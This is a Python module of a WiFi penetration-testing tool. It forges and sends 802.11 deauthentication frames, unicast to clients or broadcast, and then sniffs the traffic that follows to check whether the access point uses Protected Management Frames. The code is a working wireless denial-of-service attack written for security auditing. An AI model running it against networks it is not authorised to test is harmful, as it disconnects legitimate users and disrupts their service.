"""
modules/deauth_attack.py
Author: Martin Živný

Description
-----------
This module implements a WiFi deauthentication test in the ptwifi tool.

It constructs IEEE 802.11 deauthentication frames and transmits them toward
a specified Access Point and/or client station. 
It performs an automated PMF (802.11w) test by analyzing post-attack traffic
for reconnection attempts (Auth/Assoc frames) vs uninterrupted data flow.
Results are written directly to the provided AP object.
"""
import os
import random
from datetime import datetime

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp, sniff
from scapy.utils import wrpcap
from helpers.classes import AP

TIMEOUT_TIME = 3
PACKET_COUNT = 50
INTERVAL_SEC = 0.1

def run(interface: str, target_ap: AP, time_period: float = None, number: int = None) -> None:
    inter_sec = (time_period / 1000.0) if time_period is not None else 0.05
    packet_count = number if number is not None else PACKET_COUNT

    associated_stas = target_ap.associated_STAs 
    
    timestamp = datetime.now().strftime("[%Y-%m-%d_%H-%M]")
    pcap_export_path = f"output/deauth_attack/{timestamp}_{target_ap.bssid.replace(':', '')}.pcap"
    os.makedirs("output/deauth_attack", exist_ok=True)
    
    all_captured_packets = []

    print("\n")
    print(f"[***] Target AP: {target_ap.essid} ({target_ap.bssid})")
    print(f"[**] Channel: {target_ap.channel}")

    # 1. Targeted Unicast Attack
    if associated_stas and len(associated_stas[0]) == 17:
        for sta_mac in associated_stas:
            print(f"\n[*] PMF Test: Sending {packet_count} unicast deauth frames to {sta_mac}...")
            
            dot11 = Dot11(addr1=sta_mac, addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
            
            all_captured_packets.extend([packet] * packet_count)
            sendp(packet, iface=interface, count=packet_count, inter=inter_sec, verbose=False)

            print(f"[*] Attack finished. Monitoring for response ({TIMEOUT_TIME}s)...")
            
            frames = sniff(
                iface=interface, 
                timeout=TIMEOUT_TIME, 
                lfilter=lambda x: x.haslayer(Dot11) and x.addr2 and x.addr2.upper() == sta_mac.upper()
            )
            all_captured_packets.extend(frames)

            result_key = f"PMF_TEST_{sta_mac}"
            reconnect_frames = [f for f in frames if f.type == 0 and f.subtype in (0, 2, 11)]
            data_frames = [f for f in frames if f.type == 2 or f.type == 1]

            if len(reconnect_frames) > 0:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and is attempting to reconnect.")
                target_ap.test_results[result_key] = "Disconnected (Reconnecting)"
            elif len(data_frames) > 0:
                print(f"[+] PMF Active: Station {sta_mac} ignored deauth and continues data transmission.")
                target_ap.test_results[result_key] = "Active/Ignored"
            else:
                print(f"[-] PMF Inactive: Station {sta_mac} disconnected and went silent.")
                target_ap.test_results[result_key] = "Disconnected (Silent)"

    # 2. Broadcast Attack
    else:
        print(f"\n[*] PMF Test: No associated STAs found. Sending {packet_count} broadcast deauth frames...")
        
        dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target_ap.bssid, addr3=target_ap.bssid, type=0, subtype=12)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        all_captured_packets.extend([packet] * packet_count)
        sendp(packet, iface=interface, count=packet_count, inter=inter_sec, verbose=False)
        
        print(f"[*] Attack finished. Monitoring for BSS traffic ({TIMEOUT_TIME}s)...")
        
        frames = sniff(
            iface=interface, 
            timeout=TIMEOUT_TIME,
            lfilter=lambda x: x.haslayer(Dot11) and (
                (x.addr1 and x.addr1.upper() == target_ap.bssid.upper()) or 
                (x.addr2 and x.addr2.upper() == target_ap.bssid.upper()) or 
                (x.addr3 and x.addr3.upper() == target_ap.bssid.upper())
            )
        )
        all_captured_packets.extend(frames)

        result_key = "PMF_Broadcast"
        reconnecting_macs = set(f.addr2 for f in frames if f.type == 0 and f.subtype in (0, 2, 11) and f.addr2)
        surviving_macs = set(f.addr2 for f in frames if f.type == 2 and f.addr2 and f.addr2 not in reconnecting_macs)
        
        reconnecting_macs.discard(target_ap.bssid)
        surviving_macs.discard(target_ap.bssid)

        if surviving_macs:
            print(f"[/] New clients detected: {', '.join(surviving_macs)}")
            target_ap.test_results[result_key] = f"Active/Ignored (Hidden clients: {', '.join(surviving_macs)})"
        elif reconnecting_macs:
            print(f"[-] PMF Inactive: Hidden clients {', '.join(reconnecting_macs)} attempting to reconnect.")
            target_ap.test_results[result_key] = f"Disconnected/Reconnecting (Hidden clients: {', '.join(reconnecting_macs)})"
        else:
            print("[-] No clients detected (or all successfully disconnected and silent).")
            target_ap.test_results[result_key] = "No connected clients"

    wrpcap(pcap_export_path, all_captured_packets)
    print(f"\n[*] PCAP Session saved to: {pcap_export_path}")